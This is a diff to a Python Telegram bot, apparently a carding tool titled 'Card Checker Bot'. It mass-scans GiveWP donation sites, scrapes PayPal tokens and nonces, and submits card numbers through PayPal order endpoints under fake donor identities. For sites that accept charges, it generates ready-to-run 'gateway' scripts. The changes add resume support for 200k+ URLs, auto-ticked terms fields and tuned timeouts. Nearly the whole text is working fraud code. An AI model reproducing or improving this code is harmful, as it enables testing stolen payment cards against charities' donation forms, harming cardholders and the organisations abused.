@@ -1,10 +1,12 @@
 #!/usr/bin/env python3
 # =====================================================
-#  Card Checker Bot — FINAL v6 (Smart Refresh)
-#  - Bot tries EVERYTHING and records auth_method
-#  - Gateway file uses the same method for fast refresh
-#  - No "No GiveWP form" rejection
-#  - Works even without token
+#  Card Checker Bot — FINAL v7 (200k+ Stable)
+#  - Handles 200k+ links without crash
+#  - Resume support via /resume
+#  - Progress saved every 50 links
+#  - Terms & Conditions auto-accepted
+#  - Auto refresh (auth_method based)
+#  - Memory-safe + file-based results
 # =====================================================
 import telebot
 import time
@@ -12,6 +14,7 @@ import threading
 from telebot import types
 import requests, random, json, re, base64
 import os
+import queue
 from requests_toolbelt.multipart.encoder import MultipartEncoder
 from urllib.parse import urlparse
 import urllib3
@@ -40,7 +43,9 @@ OWNER_ID = 6843321125
 
 waiting_users = {}
 reply_mode = {}
-processing_status = {}
+processing_status = {}   # user_id -> dict
+mass_active = {}         # user_id -> True
+mass_pause = {}          # user_id -> True
 
 if not os.path.exists('blockusers.txt'):
     with open('blockusers.txt', 'w') as f:
@@ -93,19 +98,29 @@ def safe_edit_message(chat_id, message_id, text, parse_mode="HTML", retries=3):
     return None
 
 
-def safe_send_document(chat_id, file_path, caption="", parse_mode="HTML", retries=3):
+def safe_send_document(chat_id, file_path, caption="", parse_mode="HTML", retries=5):
+    if not os.path.exists(file_path):
+        return None
     for i in range(retries):
         try:
             with open(file_path, 'rb') as f:
                 return bot.send_document(chat_id, f, caption=caption, parse_mode=parse_mode)
         except Exception as e:
             err = str(e)
+            if "can't parse entities" in err.lower() or "bad request" in err.lower():
+                try:
+                    with open(file_path, 'rb') as f:
+                        plain = re.sub(r'<[^>]+>', '', caption)
+                        return bot.send_document(chat_id, f, caption=plain)
+                except: pass
             if "429" in err:
                 try:
                     wait_time = int(err.split("retry after ")[1].split(")")[0]) if "retry after" in err else 30
                 except:
                     wait_time = 30
                 time.sleep(min(wait_time, 60))
+            elif i < retries - 1:
+                time.sleep(2)
             else:
                 break
     return None
@@ -126,6 +141,30 @@ def safe_send_message(chat_id, text, parse_mode="HTML", retries=3, reply_markup=
             else:
                 break
     return None
+
+
+# ============================================================
+#  Progress save/resume
+# ============================================================
+def save_progress(user_id, data):
+    try:
+        with open(f'progress_{user_id}.json', 'w', encoding='utf-8') as f:
+            json.dump(data, f)
+    except: pass
+
+
+def load_progress(user_id):
+    try:
+        with open(f'progress_{user_id}.json', 'r', encoding='utf-8') as f:
+            return json.load(f)
+    except:
+        return None
+
+
+def clear_progress(user_id):
+    try:
+        os.remove(f'progress_{user_id}.json')
+    except: pass
 
 
 # ============================================================
@@ -239,7 +278,7 @@ def normalize_result(resp):
 
 
 # ============================================================
-#  PayPal Tester (for bot scanning)
+#  PayPalTester
 # ============================================================
 class PayPalTester:
     def __init__(self, url):
@@ -267,7 +306,8 @@ class PayPalTester:
         self.current_price_id = None
         self.all_content = ""
         self.page_html = ""
-        self.auth_method = "none"   # ← اللي نجح
+        self.auth_method = "none"
+        self.terms_required = False
         self.email = f"{random.choice(self.first_name)}{random.randint(100,999)}@gmail.com"
         self.r = requests.Session()
         self.r.verify = False
@@ -279,7 +319,7 @@ class PayPalTester:
                 r = self.r.get(self.page_url, headers={
                     'user-agent': self.uu.random,
                     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-                }, timeout=30)
+                }, timeout=25)
                 if r.status_code == 200:
                     self.page_html = r.text
                     self.all_content = r.text
@@ -299,7 +339,7 @@ class PayPalTester:
                 elif ifu.startswith('/'): ifu = f'https://{self.url}{ifu}'
                 elif not ifu.startswith('http'): ifu = f'https://{self.url}/{ifu}'
                 try:
-                    r = self.r.get(ifu, headers={'user-agent': self.uu.random}, timeout=20)
+                    r = self.r.get(ifu, headers={'user-agent': self.uu.random}, timeout=15)
                     if r.status_code == 200:
                         self.all_content += "\n" + r.text
                         parsed = urlparse(ifu)
@@ -311,12 +351,12 @@ class PayPalTester:
     def _load_external_js(self):
         js_urls = re.findall(r'<script[^>]+src=["\']([^"\']+\.js[^"\']*)["\']', self.page_html)
         priority = [u for u in js_urls if any(k in u.lower() for k in ['give', 'donation', 'paypal', 'commerce', 'token'])]
-        for js_url in priority[:10]:
+        for js_url in priority[:8]:
             try:
                 if js_url.startswith('//'): js_url = 'https:' + js_url
                 elif js_url.startswith('/'): js_url = f'https://{self.url}{js_url}'
                 elif not js_url.startswith('http'): js_url = f'https://{self.url}/{js_url}'
-                r = self.r.get(js_url, headers={'user-agent': self.uu.random}, timeout=6)
+                r = self.r.get(js_url, headers={'user-agent': self.uu.random}, timeout=5)
                 if r.status_code == 200:
                     self.all_content += "\n" + r.text
             except: continue
@@ -366,6 +406,12 @@ class PayPalTester:
             m = re.search(p, c)
             if m: self.current_price_id = m.group(1); break
 
+        # terms detection
+        if re.search(r'give_agree_to_terms|give_terms_agreement', c, re.IGNORECASE):
+            self.terms_required = True
+        if 'terms and conditions' in c.lower():
+            self.terms_required = True
+
         self.price_levels = []
         for pat, mode in [
             (r'data-price-id=["\']([^"\']+)["\'][^>]*?data-price=["\']([\d.]+)["\']', 1),
@@ -409,15 +455,6 @@ class PayPalTester:
                     if cm: self.client_id = cm.group(1)
                     if self.au: return True
                 except: pass
-        for p in [r'"accessToken"\s*:\s*"([^"]+)"',
-                  r'"(A21[A-Za-z0-9+/=_-]{40,})"']:
-            m = re.search(p, c, re.IGNORECASE)
-            if m: self.au = m.group(1); return True
-        return False
-
-    def _try_js_tokens(self):
-        if self.au: return False
-        c = self.all_content
         for p in [r'"accessToken"\s*:\s*"([^"]+)"',
                   r'"(A21[A-Za-z0-9+/=_-]{40,})"']:
             m = re.search(p, c, re.IGNORECASE)
@@ -473,8 +510,7 @@ class PayPalTester:
             self.ajax_url = f'https://{self.url}/wp-admin/admin-ajax.php'
         if not self.id_form2:
             return False
-        for action in ['give_get_form_nonce', 'give_donation_form_nonce',
-                       'give_get_nonce', 'give_form_nonce']:
+        for action in ['give_get_form_nonce', 'give_donation_form_nonce']:
             try:
                 data = {'action': action, 'form_id': self.id_form2}
                 headers = {
@@ -482,7 +518,7 @@ class PayPalTester:
                     'x-requested-with': 'XMLHttpRequest',
                     'content-type': 'application/x-www-form-urlencoded',
                 }
-                r = self.r.post(self.ajax_url, data=data, headers=headers, timeout=10)
+                r = self.r.post(self.ajax_url, data=data, headers=headers, timeout=8)
                 if r.status_code == 200 and r.text:
                     try:
                         j = r.json()
@@ -504,14 +540,18 @@ class PayPalTester:
         self._load_external_js()
         self._extract_basic()
 
-        # Step-by-step auth discovery with METHOD recording
         if not self.au:
             if self._extract_tokens():
                 self.auth_method = "token"
 
         if not self.au:
-            if self._try_js_tokens():
-                self.auth_method = "js"
+            c = self.all_content
+            for p in [r'"accessToken"\s*:\s*"([^"]+)"', r'"(A21[A-Za-z0-9+/=_-]{40,})"']:
+                m = re.search(p, c, re.IGNORECASE)
+                if m:
+                    self.au = m.group(1)
+                    self.auth_method = "js"
+                    break
 
         if not self.nonec and self.id_form2:
             self._try_ajax_nonce()
@@ -529,19 +569,11 @@ class PayPalTester:
         if not self.ajax_url:
             self.ajax_url = f'https://{self.url}/wp-admin/admin-ajax.php'
 
-        # Return True always — we'll try anyway
         return True
 
     def _attempt_charge(self, n, mm, yy, cvc, amt):
         self.donation = amt
         expiry = f"20{yy}-{mm}"
-
-        if not self.au:
-            self._extract_tokens()
-        if not self.au and self.client_id:
-            self._try_oauth()
-        if not self.au:
-            self._try_ajax_client_token()
 
         price_ids = ['custom', '3', '4', '', None]
         if self.current_price_id and self.current_price_id not in price_ids:
@@ -562,6 +594,8 @@ class PayPalTester:
                 'give_last': (None, random.choice(self.last_name)),
                 'give_email': (None, self.email),
                 'give-gateway': (None, 'paypal-commerce'),
+                'give_agree_to_terms': (None, 'on'),
+                'give_terms_agreement': (None, 'on'),
             }
             if pid is not None:
                 fields['give-price-id'] = (None, pid)
@@ -572,13 +606,10 @@ class PayPalTester:
             try:
                 r3_raw = self.r.post(self.ajax_url,
                     params={'action': 'give_paypal_commerce_create_order'},
-                    headers=he3, data=da2, timeout=15)
+                    headers=he3, data=da2, timeout=12)
                 j = r3_raw.json()
                 if j.get('success') and isinstance(j.get('data'), dict) and j['data'].get('id'):
                     order_id = j['data']['id']
-                    # ✅ لو نجح من غير token، سجل "none"
-                    if not self.au and self.auth_method == "none":
-                        self.auth_method = "none"
                     break
                 else:
                     last_create_err = str(j.get('data', {}).get('error', 'Create failed'))
@@ -613,7 +644,7 @@ class PayPalTester:
         try:
             cr = self.r.post(
                 f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source',
-                headers=he4, json=da3, timeout=15)
+                headers=he4, json=da3, timeout=12)
             confirm_body = cr.text
         except: pass
 
@@ -629,6 +660,8 @@ class PayPalTester:
                 'give_last': (None, random.choice(self.last_name)),
                 'give_email': (None, self.email),
                 'give-gateway': (None, 'paypal-commerce'),
+                'give_agree_to_terms': (None, 'on'),
+                'give_terms_agreement': (None, 'on'),
             }
             if pid is not None:
                 fields['give-price-id'] = (None, pid)
@@ -637,7 +670,7 @@ class PayPalTester:
             try:
                 r5 = self.r.post(self.ajax_url,
                     params={'action': 'give_paypal_commerce_approve_order', 'order': order_id},
-                    headers=he5, data=da4, timeout=15)
+                    headers=he5, data=da4, timeout=12)
                 text = r5.text + confirm_body
 
                 if '"success":true' in text.lower() and 'error' not in text.lower():
@@ -719,7 +752,7 @@ def check_single_link(link):
 
 
 # ============================================================
-#  Gateway generator — Smart Refresh (auth_method based)
+#  Gateway generator
 # ============================================================
 def generate_gateway_code(result, link, amount="1.00", tester=None):
     parsed = urlparse(link)
@@ -731,7 +764,7 @@ def generate_gateway_code(result, link, amount="1.00", tester=None):
     if 'ORDER_NOT_APPROVED' in result.upper() or 'PAYER_CANNOT_PAY' in result.upper():
         display_result = "Payer cannot pay for this transaction."
     else:
-        display_result = result
+        display_result = str(result)[:120]
 
     id_form1 = (tester.id_form1 if tester and tester.id_form1 else '')
     id_form2 = (tester.id_form2 if tester and tester.id_form2 else '')
@@ -764,7 +797,6 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 PAGE_URL = "{link}"
 
-# ============ HARDCODED (initial) ============
 AJAX_URL      = "{ajax_url}"
 ID_FORM1      = "{id_form1}"
 ID_FORM2      = "{id_form2}"
@@ -849,7 +881,6 @@ class PayPal:
         self.uu = UserAgent()
         self.donation = PREFERRED_AMT
 
-        # Working copies
         self.ajax_url = AJAX_URL
         self.id_form1 = ID_FORM1
         self.id_form2 = ID_FORM2
@@ -861,14 +892,11 @@ class PayPal:
         self.current_pid = CURRENT_PID
         self._refresh_count = 0
 
-    # ============== SMART REFRESH ==============
     def _refresh_fast(self):
-        """Refresh based on AUTH_METHOD — FAST"""
         if self._refresh_count >= 2:
             return False
         self._refresh_count += 1
 
-        # Always refresh nonce (cheap)
         try:
             r = self.r.get(PAGE_URL, headers={{
                 'user-agent': self.uu.random,
@@ -883,7 +911,6 @@ class PayPal:
                 m = re.search(r'name="give-form-id"\\s+value="([^"]+)"', html)
                 if m: self.id_form2 = m.group(1)
 
-                # Method-specific token refresh
                 if AUTH_METHOD == "token":
                     m = re.search(r'"data-client-token":"([^"]+)"', html)
                     if m:
@@ -897,7 +924,6 @@ class PayPal:
                             if mm: self.paypal_meta = mm.group(1)
                         except: pass
                 elif AUTH_METHOD == "js":
-                    # Small JS scan
                     js_urls = re.findall(r'<script[^>]+src=["\\']([^"\\']+\\.js[^"\\']*)["\\']', html)
                     pri = [u for u in js_urls if any(k in u.lower() for k in ['paypal','give','commerce'])][:3]
                     for ju in pri:
@@ -911,10 +937,8 @@ class PayPal:
                                     self.au = m2.group(1)
                                     break
                         except: continue
-                # AUTH_METHOD == "none" → no token needed
         except: pass
 
-        # Method-specific fallbacks (if above failed)
         if AUTH_METHOD == "oauth":
             if not self.au and self.client_id:
                 try:
@@ -952,7 +976,6 @@ class PayPal:
 
         return True
 
-    # ============== ORDER ==============
     def _try_create_order(self, amt, currency, pid):
         fields = {{
             'give-form-id-prefix': (None, self.id_form1 or ''),
@@ -965,6 +988,8 @@ class PayPal:
             'give_last': (None, random.choice(self.last_name)),
             'give_email': (None, self.email),
             'give-gateway': (None, 'paypal-commerce'),
+            'give_agree_to_terms': (None, 'on'),
+            'give_terms_agreement': (None, 'on'),
         }}
         if pid is not None:
             fields['give-price-id'] = (None, pid)
@@ -1024,6 +1049,8 @@ class PayPal:
             'give_last': (None, random.choice(self.last_name)),
             'give_email': (None, self.email),
             'give-gateway': (None, 'paypal-commerce'),
+            'give_agree_to_terms': (None, 'on'),
+            'give_terms_agreement': (None, 'on'),
         }}
         if pid is not None:
             fields['give-price-id'] = (None, pid)
@@ -1037,7 +1064,6 @@ class PayPal:
         except:
             return ""
 
-    # ============== MAIN ==============
     def Charge(self, ccx):
         ccx = ccx.strip()
         parts = ccx.split("|")
@@ -1057,13 +1083,12 @@ class PayPal:
         attempts = ["1.00", "5.00"]
         try:
             min_val = float(MINIMUM)
-            if min_val > 1.0 and f"{{min_val:.2f}}" not in attempts:
+            if min_val > 5.0 and f"{{min_val:.2f}}" not in attempts:
                 attempts.append(f"{{min_val:.2f}}")
         except: pass
 
         result = self._do_charge(n, mm, yy, cvc, attempts, price_ids)
 
-        # If failed and looks like nonce issue → refresh + retry ONCE
         if not result or '<!DOCTYPE' in str(result).upper() or '<HTML' in str(result).upper():
             if self._refresh_count < 1:
                 self._refresh_fast()
@@ -1089,7 +1114,6 @@ class PayPal:
 
             if not order_id:
                 create_errors.append((amt, last_err))
-                # If HTML response → nonce expired, try refresh mid-way
                 if last_err and ('<!DOCTYPE' in last_err.upper() or '<HTML' in last_err.upper()):
                     if self._refresh_count < 2:
                         self._refresh_fast()
@@ -1276,9 +1300,9 @@ def ali_al2(massege):
 
         caption = f'''✅ <b>Live Gateway Found!</b>
 ━━━━━━━━━━━━━━━━━━━━
-🔗 <code>{link}</code>
+🔗 <code>{link[:100]}</code>
 ━━━━━━━━━━━━━━━━━━━━
-💬 <b>Response:</b> <code>{display}</code>
+💬 <b>Response:</b> <code>{str(display)[:100]}</code>
 💰 <b>Amount:</b> <code>${tester.donation}</code>
 💱 <b>Currency:</b> <code>{tester.currency}</code>
 🔐 <b>Auth:</b> <code>{tester.auth_method}</code>
@@ -1305,17 +1329,46 @@ def mass_extract_start(message):
     if is_blocked(message.from_user.id):
         safe_send_message(message.chat.id, 'The admin has blocked you.')
         return
-    msg = safe_send_message(message.chat.id, "📁 Send a .txt file with links (one per line):")
+    user_id = message.from_user.id
+    if mass_active.get(user_id, False):
+        safe_send_message(message.chat.id, "⚠️ Job already running. Use /stop first.")
+        return
+    msg = safe_send_message(message.chat.id, 
+        "📁 Send a .txt file with links (one per line)\n"
+        "♻️ Or /resume to continue last job")
     if msg:
         bot.register_next_step_handler(msg, process_mass_file)
+
+
+@bot.message_handler(commands=['resume'])
+def mass_resume(message):
+    user_id = message.from_user.id
+    chat_id = message.chat.id
+    progress = load_progress(user_id)
+    if not progress:
+        safe_send_message(chat_id, "❌ No saved progress.")
+        return
+    total = progress.get('total', 0)
+    processed = progress.get('processed', 0)
+    if processed >= total:
+        safe_send_message(chat_id, f"✅ Job complete ({processed}/{total})")
+        clear_progress(user_id)
+        return
+    links = progress.get('links', [])
+    safe_send_message(chat_id, f"♻️ Resuming from {processed}/{total}...")
+    threading.Thread(
+        target=_run_mass_job,
+        args=(chat_id, user_id, links, processed, progress),
+        daemon=True
+    ).start()
 
 
 @bot.message_handler(commands=['stop'])
 def stop_mass(message):
     user_id = message.from_user.id
-    if user_id in processing_status:
-        processing_status[user_id]['stop_flag'] = True
-        safe_send_message(message.chat.id, "🛑 Stopping...")
+    if mass_active.get(user_id, False):
+        mass_pause[user_id] = True
+        safe_send_message(message.chat.id, "🛑 Stopping (saving progress)...")
     else:
         safe_send_message(message.chat.id, "❌ No active process.")
 
@@ -1324,131 +1377,206 @@ def process_mass_file(message):
     if not message.document:
         safe_send_message(message.chat.id, "❌ Please send a .txt file.")
         return
+
+    user_id = message.from_user.id
+    chat_id = message.chat.id
+
     try:
         file_info = bot.get_file(message.document.file_id)
         downloaded_file = bot.download_file(file_info.file_path)
         links = downloaded_file.decode('utf-8', errors='ignore').splitlines()
         links = [link.strip() for link in links if link.strip()]
-        if not links:
-            safe_send_message(message.chat.id, "❌ File is empty.")
-            return
-        total = len(links)
-        user_id = message.from_user.id
-        chat_id = message.chat.id
-        processing_status[user_id] = {
-            'total': total, 'processed': 0, 'live': 0, 'dead': 0,
-            'lock': threading.Lock(), 'current_url': '', 'current_respons': '',
-            'stop_flag': False, 'done': False
-        }
-        status_msg = safe_send_message(chat_id, f"""📊 <b>File #1 - Scanning...</b>
-━━━━━━━━━━━━━━━━━━
-📌 Total: {total}
-✅ Live: 0
-❌ Dead: 0
-⏳ Progress: 0% ░░░░░░░░░░░░░░░░░░░░
-Url : ...
-Respons : ...
-━━━━━━━━━━━━━━━━━━
-🛑 /stop to stop""")
-        if not status_msg: return
 
-        def update_status():
-            last_text = ""
-            while True:
-                time.sleep(8)
+        if not links:
+            safe_send_message(chat_id, "❌ File is empty.")
+            return
+
+        total = len(links)
+        progress = {
+            'total': total,
+            'processed': 0,
+            'live': 0,
+            'dead': 0,
+            'links': links,
+            'started_at': time.time(),
+        }
+        save_progress(user_id, progress)
+
+        safe_send_message(chat_id,
+            f"✅ Loaded: <b>{total}</b> links\n"
+            f"🚀 Starting scan...\n"
+            f"🛑 /stop to stop\n"
+            f"♻️ /resume if crashed")
+
+        threading.Thread(
+            target=_run_mass_job,
+            args=(chat_id, user_id, links, 0, progress),
+            daemon=True
+        ).start()
+
+    except Exception as e:
+        safe_send_message(chat_id, f"❌ Error: {str(e)[:100]}")
+
+
+def _run_mass_job(chat_id, user_id, links, start_idx, progress):
+    total = len(links)
+    processed = start_idx
+    live = progress.get('live', 0)
+    dead = progress.get('dead', 0)
+    started_at = progress.get('started_at', time.time())
+
+    mass_active[user_id] = True
+    mass_pause[user_id] = False
+
+    results_file = f'results_{user_id}_{int(started_at)}.txt'
+    live_dir = f'live_{user_id}_{int(started_at)}'
+    try:
+        os.makedirs(live_dir, exist_ok=True)
+    except: pass
+
+    status_msg = safe_send_message(chat_id,
+        f"📊 <b>Mass Scan</b>\n"
+        f"📌 Total: {total}\n"
+        f"♻️ From: {start_idx}\n"
+        f"⏳ Starting...")
+
+    last_update = [time.time()]
+    live_counter = [live]
+
+    try:
+        for idx in range(start_idx, total):
+            if mass_pause.get(user_id, False):
+                progress['processed'] = processed
+                progress['live'] = live
+                progress['dead'] = dead
+                save_progress(user_id, progress)
+                safe_send_message(chat_id,
+                    f"🛑 <b>Stopped</b>\n"
+                    f"📌 {processed}/{total}\n"
+                    f"♻️ /resume to continue")
+                break
+
+            link = links[idx]
+
+            try:
+                result = check_single_link(link)
+            except Exception as e:
+                result = {'link': link, 'live': False, 'respons': f'Error: {str(e)[:50]}', 'tester': None}
+
+            processed += 1
+
+            # Save to results file
+            try:
+                with open(results_file, 'a', encoding='utf-8') as f:
+                    f.write(f"{link} => {result.get('respons', 'unknown')}\n")
+            except: pass
+
+            if result and result.get('live'):
+                live += 1
+                live_counter[0] += 1
+
                 try:
-                    with processing_status[user_id]['lock']:
-                        if processing_status[user_id].get('done', False): break
-                        processed = processing_status[user_id]['processed']
-                        live = processing_status[user_id]['live']
-                        dead = processing_status[user_id]['dead']
-                        cur_url = processing_status[user_id]['current_url']
-                        cur_res = processing_status[user_id]['current_respons']
-                        percent = int((processed / total) * 100) if total > 0 else 0
-                        bar_length = 20
-                        filled = int((percent / 100) * bar_length)
-                        bar = '█' * filled + '░' * (bar_length - filled)
-                        text = f"""📊 <b>File #1 - Scanning...</b>
+                    tester = result.get('tester')
+                    code = generate_gateway_code(
+                        result['respons'], result['link'],
+                        result.get('amount', '1.00'), tester
+                    )
+                    gateway_path = os.path.join(live_dir, f'gateway_{live_counter[0]}.py')
+                    with open(gateway_path, 'w', encoding='utf-8') as f:
+                        f.write(code)
+
+                    display = result['respons']
+                    if 'ORDER_NOT_APPROVED' in display.upper() or 'PAYER_CANNOT_PAY' in display.upper():
+                        display = "Payer cannot pay for this transaction."
+                    cur = tester.currency if tester else 'USD'
+                    auth = tester.auth_method if tester else 'none'
+
+                    caption = f"""✅ <b>Live #{live_counter[0]}</b>
+🔗 <code>{result['link'][:80]}</code>
+💬 {str(display)[:80]}
+💰 ${result.get('amount', '1.00')} | 💱 {cur} | 🔐 {auth}"""
+
+                    safe_send_document(chat_id, gateway_path, caption=caption)
+                    try: os.remove(gateway_path)
+                    except: pass
+
+                except Exception as e:
+                    print(f"[live] error: {e}")
+            else:
+                dead += 1
+
+            # Save progress every 50
+            if processed % 50 == 0:
+                progress['processed'] = processed
+                progress['live'] = live
+                progress['dead'] = dead
+                save_progress(user_id, progress)
+
+            # Update status every 10s
+            now = time.time()
+            if now - last_update[0] >= 10:
+                last_update[0] = now
+                try:
+                    percent = int((processed / total) * 100) if total > 0 else 0
+                    elapsed = now - started_at
+                    speed = processed / elapsed if elapsed > 0 else 0
+                    eta = (total - processed) / speed if speed > 0 else 0
+                    bar_len = 20
+                    filled = int((percent / 100) * bar_len)
+                    bar = '█' * filled + '░' * (bar_len - filled)
+
+                    if status_msg:
+                        safe_edit_message(chat_id, status_msg.message_id,
+                            f"📊 <b>Mass Scan</b>\n"
+                            f"━━━━━━━━━━━━━━━━━━\n"
+                            f"📌 Total: {total}\n"
+                            f"✅ Live: {live}\n"
+                            f"❌ Dead: {dead}\n"
+                            f"⏳ {percent}% {bar}\n"
+                            f"⚡ Speed: {speed:.1f}/s\n"
+                            f"⏱️ ETA: {int(eta/60)}m {int(eta%60)}s\n"
+                            f"━━━━━━━━━━━━━━━━━━\n"
+                            f"🛑 /stop | ♻️ /resume")
+                except: pass
+
+            time.sleep(0.15)
+
+        # Final
+        if not mass_pause.get(user_id, False):
+            progress['processed'] = processed
+            progress['live'] = live
+            progress['dead'] = dead
+            save_progress(user_id, progress)
+
+            rate = int((live / total) * 100) if total > 0 else 0
+            final = f"""📊 <b>✅ COMPLETE!</b>
 ━━━━━━━━━━━━━━━━━━
 📌 Total: {total}
 ✅ Live: {live}
 ❌ Dead: {dead}
-⏳ Progress: {percent}% {bar}
-Url : <code>{cur_url[:60] if cur_url else '...'}</code>
-Respons : <code>{cur_res[:60] if cur_res else '...'}</code>
-━━━━━━━━━━━━━━━━━━
-🛑 /stop to stop"""
-                        if text != last_text:
-                            try:
-                                bot.edit_message_text(text, chat_id, status_msg.message_id, parse_mode="HTML")
-                                last_text = text
-                            except: pass
-                except: pass
-
-        updater = threading.Thread(target=update_status, daemon=True)
-        updater.start()
-        time.sleep(1)
-        for idx, link in enumerate(links):
-            if processing_status[user_id].get('stop_flag', False): break
-            with processing_status[user_id]['lock']:
-                processing_status[user_id]['current_url'] = link
-                processing_status[user_id]['current_respons'] = 'Checking...'
-            result = check_single_link(link)
-            with processing_status[user_id]['lock']:
-                processing_status[user_id]['processed'] += 1
-                if result and result.get('live'):
-                    processing_status[user_id]['live'] += 1
-                    live_idx = processing_status[user_id]['live']
-                    processing_status[user_id]['current_respons'] = result['respons']
-                    try:
-                        tester = result.get('tester')
-                        code = generate_gateway_code(result['respons'], result['link'], result.get('amount', '1.00'), tester)
-                        file_name = f'gateway_{live_idx}.py'
-                        with open(file_name, 'w', encoding='utf-8') as f:
-                            f.write(code)
-                        display = result['respons']
-                        if 'ORDER_NOT_APPROVED' in display.upper() or 'PAYER_CANNOT_PAY' in display.upper():
-                            display = "Payer cannot pay for this transaction."
-                        cur = tester.currency if tester else 'USD'
-                        auth = tester.auth_method if tester else 'none'
-                        safe_send_document(chat_id, file_name, caption=f"""✅ <b>Live Gateway #{live_idx}</b>
-━━━━━━━━━━━━━━━━━━━━
-🔗 <code>{result['link']}</code>
-━━━━━━━━━━━━━━━━━━━━
-💬 <b>Response:</b> <code>{display}</code>
-💰 <b>Amount:</b> <code>${result.get('amount', '1.00')}</code>
-💱 <b>Currency:</b> <code>{cur}</code>
-🔐 <b>Auth:</b> <code>{auth}</code>
-━━━━━━━━━━━━━━━━━━━━
-Dev: @FAWZY30""")
-                        try: os.remove(file_name)
-                        except: pass
-                    except Exception as e: print(f"Error sending file: {e}")
-                else:
-                    processing_status[user_id]['dead'] += 1
-                    processing_status[user_id]['current_respons'] = result.get('respons', 'Dead') if result else 'Dead'
-            time.sleep(1)
-        with processing_status[user_id]['lock']:
-            processing_status[user_id]['done'] = True
-            processed = processing_status[user_id]['processed']
-            live = processing_status[user_id]['live']
-            dead = processing_status[user_id]['dead']
-        updater.join(timeout=10)
-        final_text = f"""📊 <b>✅ Complete!</b>
-━━━━━━━━━━━━━━━━━━
-📌 Total: {total}
-✅ Live (Sent): {live}
-❌ Dead: {dead}
-💯 Rate: {int((live/total)*100) if total > 0 else 0}%
+💯 Rate: {rate}%
+📁 Results: <code>{results_file}</code>
 ━━━━━━━━━━━━━━━━━━
 Dev: @FAWZY30"""
-        try:
-            safe_edit_message(chat_id, status_msg.message_id, final_text)
-        except: safe_send_message(chat_id, final_text)
-        if user_id in processing_status:
-            del processing_status[user_id]
+
+            if status_msg:
+                safe_edit_message(chat_id, status_msg.message_id, final)
+            else:
+                safe_send_message(chat_id, final)
+            clear_progress(user_id)
+
     except Exception as e:
-        safe_send_message(message.chat.id, f"❌ Error: {str(e)[:100]}")
+        import traceback; traceback.print_exc()
+        progress['processed'] = processed
+        progress['live'] = live
+        progress['dead'] = dead
+        save_progress(user_id, progress)
+        safe_send_message(chat_id,
+            f"⚠️ <b>Crashed at {processed}/{total}</b>\n"
+            f"♻️ /resume to continue\n"
+            f"Error: {str(e)[:100]}")
+    finally:
+        mass_active[user_id] = False
 
 
 # ============================================================
@@ -1470,6 +1598,7 @@ def start(message):
 - - - - - - - - - - - - - - - - - - - - - -
 [⚡] PayPal Gateway >> /paypal
 [⚡] Mass Extract >> /mass
+[⚡] Resume Job >> /resume
 [⚡] Send Feedback >> Button Below
 - - - - - - - - - - - - - - - - - - - - - -
 [⚡] 𝐁𝐨𝐭 𝐁𝐲: @FAWZY30
